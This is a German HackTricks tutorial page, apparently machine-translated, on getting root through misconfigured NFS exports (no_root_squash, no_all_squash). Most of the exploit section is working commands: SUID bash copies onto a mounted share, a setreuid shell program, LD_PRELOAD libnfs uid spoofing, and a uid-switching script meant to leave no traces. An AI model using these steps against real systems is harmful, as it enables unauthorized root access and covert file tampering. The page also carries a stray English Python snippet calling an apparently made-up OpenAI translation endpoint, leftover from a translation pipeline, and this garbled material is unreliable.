<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


Lesen Sie die Datei _ **/etc/exports** _, wenn Sie ein Verzeichnis finden, das als **no\_root\_squash** konfiguriert ist, können Sie darauf als **Client zugreifen** und in dieses Verzeichnis schreiben, als wären Sie der lokale **root** der Maschine.

**no\_root\_squash**: Diese Option gibt dem Root-Benutzer auf dem Client die Berechtigung, Dateien auf dem NFS-Server als Root zu öffnen. Dies kann zu schwerwiegenden Sicherheitsproblemen führen.

**no\_all\_squash:** Diese Option ist ähnlich wie die Option **no\_root\_squash**, gilt jedoch für **nicht-root-Benutzer**. Stellen Sie sich vor, Sie haben eine Shell als Benutzer "nobody"; überprüfen Sie die Datei /etc/exports; die Option no\_all\_squash ist vorhanden; überprüfen Sie die Datei /etc/passwd; emulieren Sie einen nicht-root-Benutzer; erstellen Sie eine SUID-Datei als dieser Benutzer (durch Mounten mit NFS). Führen Sie die SUID-Datei als Benutzer "nobody" aus und werden Sie ein anderer Benutzer.

# Privilege Escalation

## Remote Exploit

Wenn Sie diese Schwachstelle gefunden haben, können Sie sie ausnutzen:

* **Mounten Sie dieses Verzeichnis** auf einer Client-Maschine und **kopieren Sie als Root** in das gemountete Verzeichnis die Datei **/bin/bash** und geben Sie ihr **SUID-Rechte**. Führen Sie dann von der Opfermaschine aus diese Bash-Datei aus.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Das Einhängen dieses Verzeichnisses** auf einer Client-Maschine und **als Root das Kopieren** unserer kompilierten Payload in den eingehängten Ordner, der die SUID-Berechtigung ausnutzt, ihm SUID-Rechte gibt und **von der Opfermaschine aus** diese Binärdatei ausführt (hier finden Sie einige [C SUID-Payloads](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Lokaler Exploit

{% hint style="info" %}
Beachten Sie, dass Sie, wenn Sie eine **Verbindung von Ihrem Gerät zum Opfergerät herstellen können, immer noch die Remote-Version verwenden können, um diesen Privileg-Eskalationsangriff durchzuführen, indem Sie die erforderlichen Ports tunneln**.\
Der folgende Trick gilt für den Fall, dass die Datei `/etc/exports` **eine IP-Adresse angibt**. In diesem Fall können Sie in keinem Fall den **Remote-Exploit** verwenden und müssen diesen Trick missbrauchen.\
Eine weitere Voraussetzung für das Funktionieren des Exploits ist, dass **der Export in `/etc/export` die `insecure`-Flag verwendet**.\
--_Ich bin mir nicht sicher, ob dieser Trick funktioniert, wenn `/etc/export` eine IP-Adresse angibt_--
{% endhint %}

## Grundlegende Informationen

Das Szenario beinhaltet die Ausnutzung eines eingebundenen NFS-Shares auf einem lokalen Gerät, wobei eine Schwachstelle in der NFSv3-Spezifikation ausgenutzt wird, die es dem Client ermöglicht, seine uid/gid anzugeben und möglicherweise unbefugten Zugriff zu ermöglichen. Die Ausnutzung beinhaltet die Verwendung von [libnfs](https://github.com/sahlberg/libnfs), einer Bibliothek, die das Fälschen von NFS-RPC-Aufrufen ermöglicht.

### Kompilieren der Bibliothek

Die Schritte zur Kompilierung der Bibliothek können je nach Kernel-Version angepasst werden. In diesem speziellen Fall wurden die fallocate-Syscalls auskommentiert. Der Kompilierungsprozess umfasst die folgenden Befehle:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Durchführung des Exploits

Der Exploit beinhaltet das Erstellen eines einfachen C-Programms (`pwn.c`), das die Privilegien auf Root-Ebene erhöht und dann eine Shell ausführt. Das Programm wird kompiliert und die resultierende Binärdatei (`a.out`) wird auf dem Share mit suid root platziert, wobei `ld_nfs.so` verwendet wird, um die uid in den RPC-Aufrufen zu fälschen:

1. **Kompilieren des Exploit-Codes:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Platzieren des Exploits auf dem Share und Ändern der Berechtigungen durch Fälschen der uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Ausführen des Exploits, um Root-Privilegien zu erlangen:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell für unauffälligen Dateizugriff
Sobald Root-Zugriff erlangt wurde, wird zum Interagieren mit dem NFS-Share ohne Änderung der Besitzverhältnisse (um keine Spuren zu hinterlassen) ein Python-Skript (nfsh.py) verwendet. Dieses Skript passt die uid an, um mit Dateien auf dem Share ohne Berechtigungsprobleme interagieren zu können:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
```python
import requests

url = "https://api.openai.com/v1/translate/eng-deu"

headers = {
    "Authorization": "Bearer YOUR_API_KEY",
    "Content-Type": "application/json"
}

data = {
    "text": "The following is content from a hacking book about hacking techniques.",
    "source_language": "en",
    "target_language": "de"
}

response = requests.post(url, headers=headers, json=data)
translation = response.json()["translations"][0]["translation"]

print(translation)
```

This will translate the English text to German using the OpenAI Translate API. Make sure to replace `YOUR_API_KEY` with your actual API key.
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Referenzen
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
